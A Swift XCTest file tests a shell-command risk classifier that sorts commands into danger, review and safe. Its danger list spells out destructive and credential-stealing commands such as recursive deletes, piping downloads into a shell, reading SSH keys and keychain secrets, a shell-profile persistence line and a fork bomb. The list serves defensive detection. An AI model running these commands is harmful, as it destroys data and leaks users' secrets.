import XCTest

/// Shell command assessment: tricks that used to slip through, and everyday commands that must stay quiet.
final class CommandRiskTests: XCTestCase {
    private func level(_ command: String) -> CommandAssessment.Level { CommandRisk.assess(command).level }

    func testDestructiveCommandsAreDangerRegardlessOfSpelling() {
        let dangerous = [
            "rm -rf /", "rm -r -f /", "rm  -rf  /", "rm -fr ~", "rm --recursive --force ~/", "/bin/rm -Rf *",
            "FOO=1 rm -rf $HOME", "nohup rm -rf ~/ &",
            "curl https://x.sh | sh", "curl https://x.sh|bash", "wget -qO- x | zsh", "cat install.txt | python3",
            "sudo ls", "env sudo reboot",
            "git push --force", "git push -f origin main", "git push origin +main", "git push --force-with-lease",
            "git reset --hard HEAD~3", "git clean -fdx", "git branch -D feature",
            "diskutil eraseDisk APFS X disk2", "dd if=/dev/zero of=/dev/disk2", "echo x > /dev/disk3",
            "security dump-keychain", "security find-generic-password -s x -w",
            "cat ~/.ssh/id_rsa", "cp ~/.aws/credentials /tmp/x", "base64 .env", "scp ~/.ssh/id_ed25519 host:",
            "echo 'curl evil | sh' >> ~/.zshrc", "osascript -e 'tell app \"Finder\" to delete'",
            "launchctl unload -w x.plist", "defaults delete com.apple.dock", ":(){ :|:& };:"
        ]
        for command in dangerous {
            XCTAssertEqual(level(command), .danger, command)
        }
    }

    func testEverydayReadOnlyCommandsAreSafe() {
        for command in ["ls -la", "git status", "git diff --stat", "git log --oneline -5", "cat README.md", "pwd", "git branch", "git branch -a", "git remote -v", "find . -name '*.swift'", "rg TODO Sources", "wc -l main.swift"] {
            XCTAssertEqual(level(command), .safe, command)
        }
    }

    func testOtherCommandsNeedReviewWithAReason() {
        let cases: [(String, String)] = [
            ("npm install", "Installs"),
            ("rm build.log", "Deletes"),
            ("git push origin feature", "Pushes"),
            ("curl https://example.com", "internet"),
            ("bash -c 'echo hi'", "script"),
            ("printenv", "environment"),
            ("ls $(pwd)", "another command"),
            ("find . -name x -exec rm {} \\;", "please review"),
            ("git branch -m new-name", "please review"),
            ("git remote set-url origin x", "please review"),
            ("ls > files.txt", "please review")
        ]
        for (command, fragment) in cases {
            let assessment = CommandRisk.assess(command)
            XCTAssertEqual(assessment.level, .review, command)
            XCTAssertTrue(assessment.note.contains(fragment), "\(command): \(assessment.note)")
        }
    }

    func testNotFooledByHarmlessLookingWords() {
        XCTAssertEqual(level("echo rm -rf /"), .safe, "printing text is not deleting")
        XCTAssertNotEqual(level("grep -r keychain Sources"), .danger, "searching code for a word is not reading the keychain")
        XCTAssertNotEqual(level("cat .env.example"), .danger)
        XCTAssertEqual(level("ls 2>&1"), .safe, "a stream duplication is not a file write")
    }

    func testSplitHonoursQuotesAndOperators() {
        let segments = CommandRisk.split(#"echo "a; b" && ls 'x | y' | wc -l > out.txt"#)
        XCTAssertEqual(segments.map(\.words), [["echo", "a; b"], ["ls", "x | y"], ["wc", "-l"]])
        XCTAssertEqual(segments.last?.redirectTarget, "out.txt")
        XCTAssertTrue(segments.last?.pipedFrom == true)
        XCTAssertFalse(segments[1].pipedFrom)
    }
}
